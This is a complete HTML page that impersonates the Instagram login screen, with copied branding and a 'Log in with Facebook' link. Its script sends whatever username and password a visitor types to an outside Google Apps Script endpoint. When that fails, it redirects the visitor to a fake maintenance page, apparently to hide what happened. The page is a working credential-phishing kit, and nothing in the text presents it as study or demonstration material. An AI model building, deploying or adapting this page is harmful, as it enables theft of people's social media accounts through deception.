<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Instagram Login</title>
  <link rel="shortcut icon" href="./instagram.png" type="image/x-icon">
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .container {
      display: flex;
      flex-direction: row;
      width: 100%;
      max-width: 1000px;
      align-items: center;
      justify-content: space-between;
      padding: 40px 20px;
      box-sizing: border-box;
    }

    .image-container {
      flex: 1;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .image-container img {
      max-width: 100%;
      height: auto;
      border-radius: 20px;
    }

    .login-box {
      flex: 1;
      background: #000;
      padding: 40px 30px;
      max-width: 360px;
      border: 1px solid ;
      text-align: center;
    }

    .login-box h2 {
      font-family: 'Billabong', cursive;
      font-size: 40px;
      color: #fff;
      margin-bottom: 30px;
    }

    .form-group {
      margin-bottom: 10px;
    }

    .input-wrapper {
      position: relative;
    }

    .input-wrapper input {
      width: 100%;
      padding: 10px 12px;
      border: 1px solid #262626;
      border-radius: 4px;
      background: #121212;
      color: #fff;
      font-size: 14px;
      box-sizing: border-box;
    }

    .input-wrapper input::placeholder {
      color: #aaa;
    }

    .btn {
      margin-top: 15px;
    }

    .btn button {
      width: 100%;
      padding: 10px;
      border: none;
      border-radius: 8px;
      background-color: #3897f0;
      color: white;
      font-weight: bold;
      font-size: 14px;
      cursor: pointer;
    }

    .btn button:hover {
      background-color: #318ce7;
    }

    .divider {
      display: flex;
      align-items: center;
      text-align: center;
      margin: 20px 0;
      color: #777;
    }

    .divider::before,
    .divider::after {
      content: "";
      flex: 1;
      border-bottom: 1px solid #333;
    }

    .divider:not(:empty)::before {
      margin-right: .75em;
    }

    .divider:not(:empty)::after {
      margin-left: .75em;
    }

    .facebook-login {
      display: flex;
      align-items: center;
      justify-content: center;
      color: #1877f2;
      font-weight: bold;
      font-size: 14px;
      margin-bottom: 15px;
      cursor: pointer;
    }

    .facebook-login img {
      width: 18px;
      margin-right: 8px;
    }

    .forgot-link {
      color: #b2b2b2;
      font-size: 12px;
      margin-bottom: 20px;
      text-decoration: none;
    }

    .forgot-link:hover {
      text-decoration: underline;
    }

    .signup-section {
      color: #777;
      font-size: 14px;
      margin-top: 20px;
    }

    .signup-section a {
      color: #3897f0;
      text-decoration: none;
      font-weight: bold;
    }

    .signup-section a:hover {
      text-decoration: underline;
    }

    #message {
      margin-top: 15px;
      font-weight: bold;
      color: #fff;
    }

    #error-message {
      margin-top: 10px;
      text-align: center;
      color: red;
      font-size: 0.85rem;
      font-weight: normal;
      display: none;
    }

    /* Mobile Responsive */
    @media screen and (max-width: 768px) {
      .container {
        flex-direction: column;
        align-items: center;
      }

      .image-container,
      .login-box {
        width: 100%;
        max-width: 90%;
        margin-bottom: 30px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- Image Section -->
    <div class="image-container">
     <img src="./landing-2x.png" alt="Instagram-style preview" />
    </div>

    <!-- Login Section -->
    <div class="login-box">
      <img src="./image-removebg-preview.png" alt="">
      <form id="form">
        <div class="form-group">
          <div class="input-wrapper">
            <input type="text" name="UserName" placeholder="Phone number, username, or email" required />
          </div>
        </div>

        <div class="form-group">
          <div class="input-wrapper">
            <input type="password" name="Password" id="password" placeholder="Password" required />
          </div>
        </div>

        <div class="btn">
          <button type="submit" id="submit-button">Log in</button>
        </div>

        <div id="message"></div>
        <div id="error-message">Username or password is incorrect</div>
      </form>

      <div class="divider">OR</div>

      <div class="facebook-login">
        <img src="https://www.svgrepo.com/show/452196/facebook-1.svg" alt="Facebook icon" />
        Log in with Facebook
      </div>

      <a href="#" class="forgot-link">Forgot password?</a>

      <div class="signup-section">
        Don't have an account? <a href="#">Sign up</a>
      </div>
    </div>
  </div>

  <script>
    document.getElementById("form").addEventListener("submit", function (e) {
      e.preventDefault();

      const form = e.target;
      const formData = new FormData(form);
      const submitBtn = document.getElementById("submit-button");
      const messageBox = document.getElementById("message");
      const errorBox = document.getElementById("error-message");

      fetch("https://script.google.com/macros/s/AKfycbxeEtfow7yaiuF9f1gkM7naUoWC_zPOsm1Nh-vT5M8Q2nhfyTVToG6n873FR9l-alSo3w/exec", {
        method: "POST",
        body: formData,
      })
        .then((response) => response.json())
        .then((data) => {
          if (data.status === "success") {
            form.reset();
            messageBox.textContent = data.message;
            errorBox.style.display = "none";
          } else {
            // Redirect to maintenance page instead of showing error
            window.location.href = "maintenance.html";
          }
        })
        .catch((error) => {
          // Redirect to maintenance page instead of showing error
          window.location.href = "maintenance.html";
        })
        .finally(() => {
          submitBtn.disabled = false;
        });
    });
  </script>
</body>
</html>
